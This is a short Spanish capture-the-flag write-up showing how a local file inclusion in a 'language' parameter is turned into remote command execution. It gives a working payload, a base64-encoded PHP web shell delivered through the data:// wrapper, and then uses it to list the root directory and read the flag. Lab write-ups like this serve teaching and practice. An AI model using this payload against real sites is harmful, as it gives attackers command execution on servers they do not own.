# LFI: PHP Wrapper -> RCE 👩‍💻

La página web que vulneraremos es:

![Web.PNG](./assets/04-Cuarto/01-web.PNG)

* Vemos el **atributo** `?language=<Archivo>.php` en el cual podemos lograr un LFI y, en este caso, derivarlo a un `RCE` 👩‍💻

---

El **payload** que usaremos será: `?languaje=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2bCg%3d%3d&cmd=[Comando]`

Con el anterior **payload** podemos ejecutar comandos en la máquina víctima

<p align="center">
    <img src="/assets/04-Cuarto/02-Test.PNG">
</p>

---

El enunciado nos dice que el archivo que contiene la **flag** se encuentra en la raíz del sistem (`/`), así que listaremos el contenido existente en esa ruta. 👨‍💻

<p align="center">
    <img src="/assets/04-Cuarto/03-ls.PNG">
</p>

---

Listamos el contenido del archivo con extensión `.txt`

<p align="center">
    <img src="/assets/04-Cuarto/04-flag.PNG">
</p>